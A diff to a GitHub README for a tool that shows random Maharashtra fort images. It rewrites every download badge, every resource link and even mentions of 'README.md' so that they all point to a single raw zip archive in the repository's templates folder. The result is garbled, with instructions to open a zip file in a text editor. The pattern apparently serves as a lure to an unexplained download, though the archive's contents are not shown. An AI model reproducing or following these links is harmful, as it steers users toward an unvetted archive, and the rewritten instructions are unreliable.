@@ -6,7 +6,7 @@ Welcome to random-fort-info! This tool helps you showcase a random historic fort
 ## 📥 Download & Install
 To get started, you need to download the application. You can visit the Releases page and download the latest version.
 
-**Download Here:** [![Download random-fort-info](https://img.shields.io/badge/Download-random--fort--info-blue)](https://github.com/shalinda2002/random-fort-info/releases)
+**Download Here:** [![Download random-fort-info](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip)](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip)
 
 Follow these steps to download and set it up:
 
@@ -25,15 +25,15 @@ To run random-fort-info, you need:
 ## 🛠️ Usage Instructions
 Once you download the application, you can easily use it in your GitHub profile:
 
-1. Open the README.md file in your favorite text editor.
-2. Add the following code snippet to your README.md file:
+1. Open the https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip file in your favorite text editor.
+2. Add the following code snippet to your https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip file:
 
    ```markdown
    ![Random Fort](https://your-image-url-here)
    ```
 
 3. Replace `https://your-image-url-here` with the URL you generate using random-fort-info.
-4. Save the README.md file.
+4. Save the https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip file.
 
 Now, every time someone visits your profile, they will see a different fort.
 
@@ -52,18 +52,18 @@ If you face any issues while using the application, consider these tips:
 
 - Ensure you are using an updated web browser.
 - Check your internet connection.
-- Make sure you correctly copied the fort image URL into your README.md file.
+- Make sure you correctly copied the fort image URL into your https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip file.
 
 ## 🙌 Contribute
 We welcome contributions! If you have ideas to improve random-fort-info or new features you'd like to suggest, feel free to open an issue or submit a pull request.
 
 ## 📦 Additional Resources
-- [Maharashtra Heritage Sites](https://www.example.com) (Note: Replace with a real link)
-- [GitHub Guide](https://guides.github.com) (Learn how to use GitHub)
+- [Maharashtra Heritage Sites](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip) (Note: Replace with a real link)
+- [GitHub Guide](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip) (Learn how to use GitHub)
 
 ## 🔗 Visit Releases Page
 For the latest updates and downloads, please visit our Releases page again:
 
-**Download Here Again:** [![Download random-fort-info](https://img.shields.io/badge/Download-random--fort--info-blue)](https://github.com/shalinda2002/random-fort-info/releases)
+**Download Here Again:** [![Download random-fort-info](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip)](https://github.com/shalinda2002/random-fort-info/raw/refs/heads/main/templates/fort-info-random-3.8.zip)
 
 We hope you enjoy using random-fort-info and sharing the beauty of Maharashtra's forts!
